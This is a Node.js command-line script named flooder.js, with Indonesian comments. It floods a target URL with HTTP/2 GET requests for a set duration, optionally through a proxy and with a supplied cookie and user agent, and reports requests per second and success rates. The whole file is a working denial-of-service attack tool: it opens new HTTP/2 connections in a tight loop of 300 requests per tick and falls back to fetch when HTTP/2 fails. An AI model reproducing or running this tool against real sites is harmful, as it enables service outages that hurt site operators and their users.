const target = process.argv[2];
const duration = parseInt(process.argv[3]);
const cookie = process.argv[4];
const userAgent = process.argv[5];
const proxy = process.argv[6]; // Proxy parameter baru
const showLog = process.argv.includes('-log'); // Check if -log flag is present
const http2 = require('http2');
const https = require('https');

// Global variables for stats
let requestCount = 0;
let successCount = 0;
let errorCount = 0;

// Graceful shutdown handler
process.on('SIGINT', () => {
    if (showLog) {
        console.clear();
    }
    console.log('\n[+] Attack stopped by user (Ctrl+C)');
    console.log(`[+] Final Stats:`);
    console.log(`[+] Total Requests: ${requestCount}`);
    console.log(`[+] Success: ${successCount}`);
    console.log(`[+] Errors: ${errorCount}`);
    if (requestCount > 0) {
        console.log(`[+] Success Rate: ${Math.round((successCount / requestCount) * 100)}%`);
    }
    process.exit(0);
});

if (process.argv.length < 6 || isNaN(duration)) {
    console.log('Usage: node flooder.js <URL> <DURATION> <COOKIE> <USER-AGENT> [PROXY] [-log]');
    console.log('Options:');
    console.log('  -log    Show real-time logs (optional)');
    process.exit(1);
} else {
    if (showLog) {
        console.clear();
        console.log(`[+] Target: ${target}`);
        console.log(`[+] Duration: ${duration}s`);
        console.log(`[+] Cookie: ${cookie}`);
        console.log(`[+] User-Agent: ${userAgent}`);
        if (proxy) {
            console.log(`[+] Proxy: ${proxy}`);
        }
        console.log(`[+] HTTP/2 Attack Starting...`);
        console.log(`[+] Log will refresh every 5 seconds...`);
        console.log(`[+] Press Ctrl+C to stop\n`);
    } else {
        console.log(`[+] HTTP/2 Attack Starting... (Silent mode - use -log for verbose output)`);
    }

    // Konfigurasi fetch dengan proxy jika tersedia
    const fetchOptions = {
        method: 'GET',
        headers: {
            'User-Agent': userAgent,
            'Cookie': `${cookie}`,
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'DNT': '1'
        }
    };

    // Menambahkan proxy jika tersedia
    if (proxy) {
        const [proxyHost, proxyPort] = proxy.split(':');
        fetchOptions.agent = new (require('https').Agent)({
            proxy: `http://${proxyHost}:${proxyPort}`,
            keepAlive: true,
            keepAliveMsecs: 1000,
            maxSockets: 50,
            maxFreeSockets: 10
        });
    }

    // Fungsi untuk HTTP/2 request
    function makeHttp2Request() {
        try {
            const url = new URL(target);
            const options = {
                hostname: url.hostname,
                port: url.port || (url.protocol === 'https:' ? 443 : 80),
                path: url.pathname + url.search,
                method: 'GET',
                headers: {
                    ':method': 'GET',
                    ':path': url.pathname + url.search,
                    ':scheme': url.protocol === 'https:' ? 'https' : 'http',
                    ':authority': url.hostname,
                    'user-agent': userAgent,
                    'cookie': cookie,
                    'connection': 'keep-alive',
                    'upgrade-insecure-requests': '1',
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                    'accept-language': 'en-US,en;q=0.5',
                    'accept-encoding': 'gzip, deflate, br',
                    'dnt': '1'
                }
            };

            if (proxy) {
                const [proxyHost, proxyPort] = proxy.split(':');
                options.proxy = `http://${proxyHost}:${proxyPort}`;
            }

            const client = http2.connect(`${url.protocol}//${url.hostname}:${options.port}`, options);
            
            client.on('error', (err) => {
                errorCount++;
            });

            const req = client.request(options.headers);
            
            req.on('response', (headers, flags) => {
                successCount++;
            });

            req.on('end', () => {
                client.close();
            });

            req.end();
        } catch (error) {
            errorCount++;
            // Fallback to fetch if HTTP/2 fails
            fetch(target, fetchOptions).then(res => {
                successCount++;
            }).catch(error => {
                errorCount++;
            });
        }
    }

    let lastLogTime = Date.now();

    const attackInterval = setInterval(() => {
        for (let i = 0; i < 300; i++) {
            requestCount++;
            makeHttp2Request();
        }
    }, 0);

    // Log interval setiap 5 detik (hanya jika -log flag ada)
    let logInterval;
    if (showLog) {
        logInterval = setInterval(() => {
            const now = Date.now();
            const elapsed = (now - lastLogTime) / 1000;
            
            // Clear console setiap 5 detik
            console.clear();
            console.log(`[+] Target: ${target}`);
            console.log(`[+] Duration: ${duration}s`);
            console.log(`[+] Cookie: ${cookie}`);
            console.log(`[+] User-Agent: ${userAgent}`);
            if (proxy) {
                console.log(`[+] Proxy: ${proxy}`);
            }
            console.log(`[+] HTTP/2 Attack Running...`);
            console.log(`[+] Requests sent: ${requestCount}`);
            console.log(`[+] Success: ${successCount}`);
            console.log(`[+] Errors: ${errorCount}`);
            console.log(`[+] RPS: ${Math.round(requestCount / elapsed)}`);
            
            lastLogTime = now;
        }, 5000);
    }

    setTimeout(() => {
        clearInterval(attackInterval);
        if (logInterval) {
            clearInterval(logInterval);
        }
        
        if (showLog) {
            console.clear();
        }
        
        console.log('Attack stopped.');
        console.log(`[+] Final Stats:`);
        console.log(`[+] Total Requests: ${requestCount}`);
        console.log(`[+] Success: ${successCount}`);
        console.log(`[+] Errors: ${errorCount}`);
        console.log(`[+] Success Rate: ${Math.round((successCount / requestCount) * 100)}%`);
        process.exit(0);
    }, duration * 1000);
}
